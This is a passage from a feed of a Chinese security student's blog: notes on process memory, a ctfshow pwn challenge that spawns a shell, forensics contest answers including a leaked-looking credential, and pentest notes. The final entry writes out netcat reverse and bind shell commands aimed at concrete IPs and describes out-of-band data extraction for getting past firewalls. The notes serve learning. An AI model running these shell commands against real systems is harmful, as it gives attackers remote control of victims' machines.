查看elf文件头信息"></a>readelf -h 查看elf文件头信息</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713021258414.png" alt="image-20230713021258414"></p><h2 id="十二、堆和栈"><a href="#十二、堆和栈" class="headerlink" title="十二、堆和栈"></a>十二、堆和栈</h2><p>1、虚拟空间地址（VMA）对进程的地址空间进行管理</p><p>2、程序直线所用的栈（Stack）、堆（Heap）空间的表现由VMA来控制</p><p>3、使用/proc可以看到VMA地址和堆栈的映射</p><h3 id="1、例子：-00205-c"><a href="#1、例子：-00205-c" class="headerlink" title="1、例子：    00205.c"></a>1、例子：    00205.c</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char* flag = "ctfshow{flag_is_here}";int main(){ while(1){ sleep(1); printf("%s",flag); fflush(stdout); } return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-gcc-o-00205-2-00205-c-转化为可执行文件"><a href="#1-gcc-o-00205-2-00205-c-转化为可执行文件" class="headerlink" title="1.gcc -o 00205-2 00205.c 转化为可执行文件"></a>1.gcc -o 00205-2 00205.c 转化为可执行文件</h4><h4 id="2-运行00205-2"><a href="#2-运行00205-2" class="headerlink" title="2.运行00205-2"></a>2.运行00205-2</h4><h4 id="3-ps-aux-grep-00205-2获取PID"><a href="#3-ps-aux-grep-00205-2获取PID" class="headerlink" title="3.ps aux | grep 00205-2获取PID"></a>3.ps aux | grep 00205-2获取PID</h4><h4 id="4-cat-x2F-proc-x2F-33983-x2F-maps-看程序-进程的内存的详细映射"><a href="#4-cat-x2F-proc-x2F-33983-x2F-maps-看程序-进程的内存的详细映射" class="headerlink" title="4.cat /proc/33983/maps  看程序 进程的内存的详细映射"></a>4.cat /proc/33983/maps  看程序 进程的内存的详细映射</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713034048625.png" alt="image-20230713034048625"></p><h3 id="2、进程的VMA区域"><a href="#2、进程的VMA区域" class="headerlink" title="2、进程的VMA区域"></a>2、进程的VMA区域</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/002-1.jpg" alt="002-1"></p><h3 id="3、进程栈初始化"><a href="#3、进程栈初始化" class="headerlink" title="3、进程栈初始化"></a>3、进程栈初始化</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713034926454.png" alt="image-20230713034926454"></p><h3 id="4、栈空间"><a href="#4、栈空间" class="headerlink" title="4、栈空间"></a>4、栈空间</h3><p>栈空间（Stack Space）是计算机内存中的一种区域，主要用于存储程序运行时的临时数据，如函数调用时的参数、返回地址以及局部变量等。栈空间的特 点是后进先出（LIFO，Last In First Out），即最后进入栈的数据会被最先取出。</p><p>在程序运行时，每当有函数调用发生，系统会在栈空间中为这个函数分配一块区域，这块区域被称为”栈帧”（Stack Frame）。栈帧中存储了这个函数的局部变量、参数以及返回地址等信息。当函数执行完毕后，对应的栈帧就会被销毁，释放其占用的栈空间。</p><p>栈空间的大小通常是有限的。如果程序在运行过程中超出了栈空间的大小限制，就会发生”栈溢出”（Stack Overflow）错误。这通常是由于递归调用过深或者局部变量过多导致的。</p><p>总的来说，栈空间是程序运行时存储临时数据的重要区域，它的管理方式决定了函数调用的工作方式以及程序的运行效率。</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713035715924.png" alt="image-20230713035715924"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713041716448.png" alt="image-20230713041716448"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;链接（LINKING）&quot;&gt;&lt;a href=&quot;#链接（LINKING）&quot; class=&quot;headerlink&quot; title=&quot;链接（LINKING）&quot;&gt;&lt;/a&gt;链接（LINKING）&lt;/h1&gt;&lt;h2 id=&quot;一、静态链接&quot;&gt;&lt;a href=&quot;#一、静态链接&quot; cla</summary>
      
    
    
    
    <category term="PWN入门" scheme="https://poison-biao.github.io/categories/PWN%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="PWN入门课程" scheme="https://poison-biao.github.io/tags/PWN%E5%85%A5%E9%97%A8%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>pwn004函数</title>
    <link href="https://poison-biao.github.io/du-yu/pwn-begain-exerciser-01.html"/>
    <id>https://poison-biao.github.io/du-yu/pwn-begain-exerciser-01.html</id>
    <published>2023-07-10T09:56:00.000Z</published>
    <updated>2023-07-10T09:59:06.761Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn004"><a href="#pwn004" class="headerlink" title="pwn004"></a>pwn004</h1><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp) // 定义一个main函数，它接收三个参数：命令行参数的数量，命令行参数的列表，和环境变量的列表{  char s1[11]; // 定义一个字符数组s1，大小为11  char s2[12]; // 定义一个字符数组s2，大小为12  unsigned __int64 v6; // 定义一个unsigned __int64类型的变量v6  v6 = __readfsqword(0x28u); // 从FS段寄存器的偏移量0x28处读取一个64位的值，并赋值给v6。这通常用于实现堆栈保护  setvbuf(_bss_start, 0LL, 2, 0LL); // 设置_bss_start的缓冲区模式为无缓冲  setvbuf(stdin, 0LL, 2, 0LL); // 设置stdin的缓冲区模式为无缓冲  strcpy(s1, "CTFshowPWN"); // 将字符串"CTFshowPWN"复制到s1中  logo(); // 调用logo函数，这个函数的具体实现没有给出，可能是用来显示一些信息或者图标  puts("find the secret !"); // 输出字符串"find the secret !"  __isoc99_scanf("%s", s2); // 从stdin读取一个字符串，并存储到s2中  if ( !strcmp(s1, s2) ) // 如果s1和s2相同（strcmp的返回值为0），则执行下一行的函数    execve_func(); // 调用execve_func函数，这个函数的具体实现没有给出，可能是执行一些特定的操作  return 0; // main函数返回0，表示程序正常结束}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="execve-func-函数："><a href="#execve-func-函数：" class="headerlink" title="execve_func()函数："></a>execve_func()函数：</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">unsigned __int64 execve_func() // 定义一个返回类型为unsigned __int64的函数execve_func{  char *argv[3]; // 定义一个字符指针数组argv，大小为3。这个数组用来存储execve函数的参数  unsigned __int64 v2; // 定义一个unsigned __int64类型的变量v2  v2 = __readfsqword(0x28u); // 从FS段寄存器的偏移量0x28处读取一个64位的值，并赋值给v2。这通常用于实现堆栈保护  argv[0] = "/bin/sh"; // 将argv数组的第一个元素设为"/bin/sh"，这是要执行的程序的路径  argv[1] = 0LL; // 将argv数组的第二个元素设为0，表示参数列表结束  argv[2] = 0LL; // 将argv数组的第三个元素设为0，表示参数列表结束  execve("/bin/sh", argv, 0LL); // 调用execve函数，执行"/bin/sh"程序。argv是参数列表，0LL表示环境变量列表为空  return __readfsqword(0x28u) ^ v2; // 从FS段寄存器的偏移量0x28处再次读取一个64位的值，并与v2进行异或操作。如果结果为0，表示在函数执行过程中，堆栈没有被破坏}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数的主要逻辑是执行一个新的程序（bin/sh），并检查在执行过程中堆栈是否被破坏。如果堆栈被破坏，函数返回的值将不为0</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn004&quot;&gt;&lt;a href=&quot;#pwn004&quot; class=&quot;headerlink&quot; title=&quot;pwn004&quot;&gt;&lt;/a&gt;pwn004&lt;/h1&gt;&lt;h2 id=&quot;main函数&quot;&gt;&lt;a href=&quot;#main函数&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="PWN入门" scheme="https://poison-biao.github.io/categories/PWN%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="PWN入门刷题" scheme="https://poison-biao.github.io/tags/PWN%E5%85%A5%E9%97%A8%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>计算机基础</title>
    <link href="https://poison-biao.github.io/du-yu/pwn-begain-study01.html"/>
    <id>https://poison-biao.github.io/du-yu/pwn-begain-study01.html</id>
    <published>2023-07-09T16:00:45.000Z</published>
    <updated>2023-07-13T06:46:17.836Z</updated>
    
    <content type="html"><![CDATA[<h1 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a><strong>计算机基础</strong></h1><h2 id="一、操作系统"><a href="#一、操作系统" class="headerlink" title="一、操作系统"></a>一、操作系统</h2><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-1.jpg" alt="001-1" style="zoom:50%;"><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-2.jpg" alt="001-2" style="zoom:50%;"><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-3.jpg" alt="001-3" style="zoom:50%;"><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-4.jpg" alt="001-4" style="zoom: 50%;"><h3 id="1、程序运行只在乎和编辑虚拟地址"><a href="#1、程序运行只在乎和编辑虚拟地址" class="headerlink" title="1、程序运行只在乎和编辑虚拟地址"></a>1、程序运行只在乎和编辑虚拟地址</h3><p>虚拟地址是由CPU和操作系统共同提供的一种内存管理技术。在现代计算机系统中，<strong>每个运行的程序都认为自己独占了所有的内存</strong>，<strong>这些内存地址就是虚拟地址</strong>。实际上，这些虚拟地址是由操作系统通过内存管理单元（MMU）映射到物理内存地址的。</p><h2 id="2、思考"><a href="#2、思考" class="headerlink" title="2、思考:"></a>2、思考:</h2><p> 在一个内存为256M的计算机上:执行程序A(需要内存10M),程序A连续计算并输出所得的质数。同时执行程序B(需要内存5M)，B程序从a.txt读入130MB数据，从b.xt读入50MB数据,数据合并后,存入c.txt. CPU是加何运作的? </p><ol><li><h3 id="程序加载："><a href="#程序加载：" class="headerlink" title="程序加载："></a><strong>程序加载</strong>：</h3><p>首先，操作系统会将程序A和程序B加载到内存中。由于程序A需要10MB内存，程序B需要5MB内存，总共需要15MB内存，这在256MB的内存中是完全可以容纳的。</p></li><li><h3 id="CPU调度："><a href="#CPU调度：" class="headerlink" title="CPU调度："></a><strong>CPU调度</strong>：</h3><p>操作系统会使用一种叫做进程调度的技术，将CPU的时间分配给程序A和程序B。例如，它可能先让程序A运行一段时间，然后再让程序B运行一段时间，如此反复，使得两个程序看起来像是在同时运行。</p></li><li><h3 id="虚拟内存和磁盘I-x2F-O："><a href="#虚拟内存和磁盘I-x2F-O：" class="headerlink" title="虚拟内存和磁盘I/O："></a><strong>虚拟内存和磁盘I/O</strong>：</h3><p>对于程序B，它需要读取的数据总量（130MB + 50MB）超过了物理内存的大小（256MB）。在这种情况下，操作系统会使用一种叫做虚拟内存的技术，将部分数据暂时存储在硬盘上，然后在需要的时候将这些数据加载到内存中。这种技术叫做页面交换（Page Swapping）或者换页（Paging）。同时，操作系统会使用缓冲技术，将读取和写入的数据暂时存储在内存中，然后在合适的时候再进行实际的磁盘I/O操作。</p></li><li><h3 id="数据合并和存储："><a href="#数据合并和存储：" class="headerlink" title="数据合并和存储："></a><strong>数据合并和存储</strong>：</h3><p>程序B在读取完所有数据并进行合并后，会将结果写入c.txt文件。这个过程可能会涉及到磁盘I/O操作，操作系统会负责管理这些操作。</p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>CPU和操作系统会共同工作，通过进程调度、虚拟内存、磁盘I/O等技术，使得程序A和程序B可以在有限的内存和CPU资源中同时运行，并完成各自的任务。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;计算机基础&quot;&gt;&lt;a href=&quot;#计算机基础&quot; class=&quot;headerlink&quot; title=&quot;计算机基础&quot;&gt;&lt;/a&gt;&lt;strong&gt;计算机基础&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;一、操作系统&quot;&gt;&lt;a href=&quot;#一、操作系统&quot; class=&quot;hea</summary>
      
    
    
    
    <category term="PWN入门" scheme="https://poison-biao.github.io/categories/PWN%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="PWN入门课程" scheme="https://poison-biao.github.io/tags/PWN%E5%85%A5%E9%97%A8%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>电子取证红包赛</title>
    <link href="https://poison-biao.github.io/du-yu/cppu-electronic-forensics-01.html"/>
    <id>https://poison-biao.github.io/du-yu/cppu-electronic-forensics-01.html</id>
    <published>2023-07-06T13:06:00.000Z</published>
    <updated>2023-07-08T10:31:08.376Z</updated>
    
    <content type="html"><![CDATA[<p>每日吐槽：蛙趣啊！~   该说不说，取证大师真的很强，但是也确实搞心态啊，取证三次，电脑崩掉2次，天选三太废物了啊~</p><p>1、cd082d248033cd557b42b5faa0de5b9f</p><p>(MD5: cd082d248033cd557b42b5faa0de5b9f<br>SHA1: b4b1c4145c599e7d232c3611317ed076495dafb9<br>SHA256: 78295b0b7a71c7dd7555cb2db923de6f78f5338a6aae9150a34fecd535487360<br>CRC32: b7ee2645)</p><p>2、6.1</p><p>3、2020-09-23 14:24:54</p><p>4、A</p><p>5、192.168.152.128</p><p>6、(UTC+08:00)</p><p>7、 ceabb038fdc3e2e55c1e78ad0a2e5fb9</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702160238449.png" alt="image-20230702160238449" style="zoom:25%;"><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702160401497.png" alt="image-20230702160401497" style="zoom:25%;"><p>8、6191e971cfdf5296ee7df7c2fed56377</p><p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702162304311.png" alt="image-20230702162304311"></p><p>9、HackBar V2   、    Proxy SwitchyOmega</p><p>（差点被LZJ骗了，这个就是对的）</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702154910574.png" alt="image-20230702154910574" style="zoom:25%;"><p>10、7.2.</p><img src="C:\Users\asus\Pictures\Screenshots\Snipaste_2023-07-02_15-41-43.png" alt="Snipaste_2023-07-02_15-41-43" style="zoom:25%;"><p>11、192.168.152.150</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702180300769.png" alt="image-20230702180300769" style="zoom:25%;"><p>12、00-0C-29-0F-B9-F7</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702163500129.png" alt="image-20230702163500129" style="zoom:25%;"><p>13、CaiXX-PC</p><p>14、pico2020</p><p>15、105,906,176</p><p>16、A</p><p>17、B</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702182224126.png" alt="image-20230702182224126" style="zoom:25%;"><p>18、12753</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702193248514.png" alt="image-20230702193248514" style="zoom:25%;"><p>19、 8f8319bc3c1b8ed92aa5498dd98c8e87e5f888f7<img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702193115519.png" alt="image-20230702193115519" style="zoom:25%;"></p><p>20、Administrator   、    Guest 、  chaunchaun</p><p>22、shuandan</p><p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702193916532.png" alt="image-20230702193916532"></p><p>23、<a href="http://www.tpshop.com.tar.gz/">www.tpshop.com.tar.gz</a></p><p>24、120ac49800671dc383b6f3709c25c099</p><p>两都是一样，所以是同一个webshell<img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702195054106.png" alt="image-20230702195054106"></p><p>25、 tpshop / s13132312s<img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702195519596.png" alt="image-20230702195519596" style="zoom:25%;"></p><p>27、26</p><p>31、9176</p><p>37、101</p><p>（一个一个数）</p><p>38、B</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;每日吐槽：蛙趣啊！~   该说不说，取证大师真的很强，但是也确实搞心态啊，取证三次，电脑崩掉2次，天选三太废物了啊~&lt;/p&gt;
&lt;p&gt;1、cd082d248033cd557b42b5faa0de5b9f&lt;/p&gt;
&lt;p&gt;(MD5: cd082d248033cd557b42b5f</summary>
      
    
    
    
    <category term="电子取证" scheme="https://poison-biao.github.io/categories/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"/>
    
    
    <category term="取证校赛" scheme="https://poison-biao.github.io/tags/%E5%8F%96%E8%AF%81%E6%A0%A1%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>050文件上传漏洞</title>
    <link href="https://poison-biao.github.io/du-yu/vulnerability-learning-02.html"/>
    <id>https://poison-biao.github.io/du-yu/vulnerability-learning-02.html</id>
    <published>2023-07-05T08:27:16.000Z</published>
    <updated>2023-07-06T13:39:58.915Z</updated>
    
    <content type="html"><![CDATA[<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>上传图片—–&gt;base64数据（文件上传变为数据形式 ，方便存储在数据库中）</p><p>显示图片—–&gt;解码数据还原，如果不是图片则不显示</p><p>（可能有特殊符号各种什么的，转化为数据进行完整封装）</p><p>解析协议固定</p><p>不管是什么文件类型</p><p>解析为指定数据类型</p><p>数据存储文件，固定的协议解析文件</p><p>不管上传什么文件，只认数据</p><h3 id="大网站分站存储"><a href="#大网站分站存储" class="headerlink" title="大网站分站存储"></a>大网站分站存储</h3><p>保护域名——————–&gt;控制解析</p><p>想测试ZZ</p><p>OSS存储</p><p>如何判断：<strong>1.看上传之后的访问地址，如果后门无法解析就</strong></p><p><strong>2.看上传的数据包（bilibili）</strong></p><p><strong>3.分站上传看访问地址</strong></p><p><strong>4.一打开就是下载</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/Vulnerability-learning.png" alt="Vulnerability-learning"></p><h1 id="绕过（除了下面这种其他无解）"><a href="#绕过（除了下面这种其他无解）" class="headerlink" title="绕过（除了下面这种其他无解）"></a>绕过（除了下面这种其他无解）</h1><p>文件被锁</p><p>能控制上传文件写入目录</p><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><p>上传以后就被杀掉了</p><h1 id="SDK阿里云"><a href="#SDK阿里云" class="headerlink" title="SDK阿里云"></a>SDK阿里云</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h3&gt;&lt;p&gt;上传图片—–&amp;gt;base64数据（文件上传变为数据形式 ，方便存储在数据库中）&lt;/p&gt;
&lt;p&gt;显示图片—</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透-漏洞学习" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>049挖洞思路</title>
    <link href="https://poison-biao.github.io/du-yu/vulnerability-learning-01.html"/>
    <id>https://poison-biao.github.io/du-yu/vulnerability-learning-01.html</id>
    <published>2023-07-05T08:27:01.000Z</published>
    <updated>2023-07-06T13:39:48.578Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP中间件"><a href="#PHP中间件" class="headerlink" title="PHP中间件"></a>PHP中间件</h2><p>形成：网上找的中间件</p><h3 id="编译器漏洞"><a href="#编译器漏洞" class="headerlink" title="编译器漏洞"></a>编译器漏洞</h3><p>编译器（文件上传文件解析）</p><p>形成原因：代码逻辑存在安全问题（可能是从网上找的代码）</p><p>扫描目录，看ue版本，利用漏洞</p><h2 id="CMS源码"><a href="#CMS源码" class="headerlink" title="CMS源码"></a>CMS源码</h2><p>知道网站程序</p><p>已知漏洞，直接放到漏洞检测工具 </p><h2 id="原生态"><a href="#原生态" class="headerlink" title="原生态"></a>原生态</h2><p>对目标一无所知</p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>审计自己写的和抄袭的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PHP中间件&quot;&gt;&lt;a href=&quot;#PHP中间件&quot; class=&quot;headerlink&quot; title=&quot;PHP中间件&quot;&gt;&lt;/a&gt;PHP中间件&lt;/h2&gt;&lt;p&gt;形成：网上找的中间件&lt;/p&gt;
&lt;h3 id=&quot;编译器漏洞&quot;&gt;&lt;a href=&quot;#编译器漏洞&quot; class=&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透-漏洞学习" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>06抓包技术&amp;HTTPS协议&amp;APP&amp;小程序&amp;PC应用&amp;WEB&amp;转发联动</title>
    <link href="https://poison-biao.github.io/du-yu/information-collection-06.html"/>
    <id>https://poison-biao.github.io/du-yu/information-collection-06.html</id>
    <published>2023-07-03T16:00:06.000Z</published>
    <updated>2023-07-06T13:40:12.723Z</updated>
    
    <content type="html"><![CDATA[<h3 id="web协议的抓包"><a href="#web协议的抓包" class="headerlink" title="web协议的抓包"></a>web协议的抓包</h3><p>工具：charles（茶杯）  Telerik Fiddler</p><p>BP设置代理的原理：感觉像充当一个VPN，让浏览器走监听的端口，BP监听或者拦截</p><p><strong>本机</strong>：证书——&gt;抓包</p><p><strong>模拟器</strong>：证书—–&gt;设置代理——&gt;抓包（封装和没封装的APP都能抓到）</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p>、<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-07%20085010.png" alt="屏幕截图 2023-06-07 085010"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;web协议的抓包&quot;&gt;&lt;a href=&quot;#web协议的抓包&quot; class=&quot;headerlink&quot; title=&quot;web协议的抓包&quot;&gt;&lt;/a&gt;web协议的抓包&lt;/h3&gt;&lt;p&gt;工具：charles（茶杯）  Telerik Fiddler&lt;/p&gt;
&lt;p&gt;BP设置代理的</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透-信息收集" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>05基础命令&amp;反弹shell&amp;数据不回显带外查询</title>
    <link href="https://poison-biao.github.io/du-yu/information-collection-05.html"/>
    <id>https://poison-biao.github.io/du-yu/information-collection-05.html</id>
    <published>2023-07-03T16:00:05.000Z</published>
    <updated>2023-07-06T13:40:05.627Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、常规基本渗透命令详解"><a href="#一、常规基本渗透命令详解" class="headerlink" title="一、常规基本渗透命令详解"></a>一、常规基本渗透命令详解</h2><p>(<a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a>)</p><h4 id="实用案例1：文件上传下载-解决无图形化-amp-解决数据传输"><a href="#实用案例1：文件上传下载-解决无图形化-amp-解决数据传输" class="headerlink" title="实用案例1：文件上传下载-解决无图形化&amp;解决数据传输"></a>实用案例1：文件上传下载-解决无图形化&amp;解决数据传输</h4><p> 解决问题：不能正常在目标靶机下载后门，将文件上传到web服务器，在目标靶机用棱角社区生成的命令下载到目标靶机上</p><p>棱角社区：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p><h2 id="二、反弹S-hell命令-解决数据回显-amp-解决数据通讯"><a href="#二、反弹S-hell命令-解决数据回显-amp-解决数据通讯" class="headerlink" title="二、反弹S hell命令-解决数据回显&amp;解决数据通讯"></a>二、反弹S hell命令-解决数据回显&amp;解决数据通讯</h2><p>常规的shell连接，攻击者的系统会连接到受害者的系统。但在反弹shell中，情况正好相反，是受害者的系统连接到攻击者的系统。好处：可以绕过防火墙和其他安全措施，因为大多数防火墙都是配置为阻止入站连接，而不是出站连接。</p><p>前提：需要攻击者能够在受害者的系统上<strong>执行代码</strong>，这通常需要利用某种漏洞，或者通过社会工程学的手段诱骗受害者执行恶意代码。此外，一旦建立了反弹shell，攻击者需要保持其系统在线，并监听来自受害者系统的连接。如果攻击者的系统离线，或者不再监听，那么反弹shell就会失效。</p><p>命令生成：<a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p><p><strong>实例</strong>：</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606173654309.png" alt="image-20230606173654309"></p><h2 id="三、正反向代理"><a href="#三、正反向代理" class="headerlink" title="三、正反向代理"></a>三、正反向代理</h2><h4 id="原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接"><a href="#原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接" class="headerlink" title="原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接"></a>原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接</h4><p>1、正向连接：本地监听等待对方连接</p><p>Linux控制Windows</p><p>//绑定CMD到本地5566端口</p><p>nc -e cmd -lvp 5566</p><p>//主动连接目标5566</p><p>ncat 47.122.23.131 5566</p><p>Windows控制Linux</p><p>//绑定SH到本地5566端口</p><p>ncat -e /bin/sh -lvp 5566</p><p>//主动连接目标5566</p><p>nc 47.94.236.117 5566</p><p>2、反向连接：主动给出去，对方监听</p><p>//绑定CMD到目标5566端口</p><p>ncat -e /bin/sh 47.122.23.131 5566</p><p>//等待5566连接</p><p>nc -lvvp 5566</p><p>//绑定CMD到目标5566端口</p><p>nc -e cmd 47.94.236.117 5566</p><p>//等待5566连接</p><p>ncat -lvvp 5566</p><h2 id="四、内网服务器"><a href="#四、内网服务器" class="headerlink" title="四、内网服务器"></a>四、内网服务器</h2><p>只有内网IP主动出去找主机IP（唯一）才行</p><p>在内网的路由器上设置一个<strong>端口转发</strong>（端口隐私），可以和内网的目标IP交互 </p><p><strong>两边都是内网</strong>，需要一个中间人</p><h2 id="五、数据回显-查询带外-amp-网络协议层级"><a href="#五、数据回显-查询带外-amp-网络协议层级" class="headerlink" title="五、数据回显-查询带外&amp;网络协议层级"></a>五、数据回显-查询带外&amp;网络协议层级</h2><p><strong>实例：</strong>防火墙组合数据不回显-ICMP带外查询Dnslog</p><p>漏洞有，数据无法回显：（原因：回显源代码被注释掉了或者直接没有）</p><p>解决：1.反弹shell </p><p>​          2.带外查询</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606184614766.png" alt="image-20230606184614766"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606185106252.png" alt="image-20230606185106252"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606185235140.png" alt="image-20230606185235140"></p><h2 id="带外查询："><a href="#带外查询：" class="headerlink" title="带外查询："></a>带外查询：</h2><p>演示中防火墙都开着，ping命令能绕过防火墙（大部分时候），<code>ping</code>命令使用的是ICMP协议（Internet Control Message Protocol），防火墙过滤的是TCP和UDP协议，比ICMP协议低一级</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606202146536.png" alt="image-20230606202146536"></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606225717092.png" alt="image-20230606225717092"></h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606230834445.png" alt="image-20230606230834445"></p><h2 id="六、防火墙出入站设置"><a href="#六、防火墙出入站设置" class="headerlink" title="六、防火墙出入站设置"></a>六、防火墙出入站设置</h2><p>入站设置：检查入站流量，只能<strong>反向连接</strong>，主动给出</p><p>出站设置：检查出站流量，<strong>正向连接</strong>（但是入站也会默认开启较严格的设置）</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p> <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230607084906805.png" alt="image-20230607084906805"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、常规基本渗透命令详解&quot;&gt;&lt;a href=&quot;#一、常规基本渗透命令详解&quot; class=&quot;headerlink&quot; title=&quot;一、常规基本渗透命令详解&quot;&gt;&lt;/a&gt;一、常规基本渗透命令详解&lt;/h2&gt;&lt;p&gt;(&lt;a href=&quot;https://blog.csdn.ne</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
